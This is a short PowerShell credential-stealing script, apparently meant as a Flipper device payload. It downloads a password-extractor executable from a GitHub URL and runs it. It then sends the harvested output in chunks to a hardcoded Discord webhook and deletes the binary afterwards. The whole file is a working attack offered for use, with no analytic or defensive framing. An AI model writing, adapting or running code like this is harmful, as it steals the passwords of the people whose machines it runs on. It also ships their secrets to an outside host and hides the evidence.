# payload.ps1

# Your Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1369454757533454356/B2fwEhJqhY2nuEmIoQNaKFAzfe8VWkjHXzZmXFhKNCblp-xT-CgkoOPL6DEf-N4XXNZo'

# URL of the Windows password extractor binary
$exeUrl = 'https://github.com/aran1910/ddd/raw/refs/heads/main/dietpeng.exe'

# Local filename for the extractor
$exePath = '.\dietpel.exe'

# Download the extractor if it's not already there
if (-not (Test-Path $exePath)) {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
}

# Run it and capture all output as a single string
$output = & $exePath | Out-String

# If there was any output, split into 2000-char chunks and POST each to Discord
if ($output) {
    $chunks = [Math]::Ceiling($output.Length / 2000)
    for ($i = 0; $i -lt $chunks; $i++) {
        $start   = $i * 2000
        $length  = [Math]::Min(2000, $output.Length - $start)
        $content = $output.Substring($start, $length)

        $body = @{
            username = 'Flipper'
            content  = $content
        } | ConvertTo-Json

        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
        Start-Sleep -Seconds 1
    }
}

# Clean up the extractor binary
Remove-Item -Path $exePath -Force
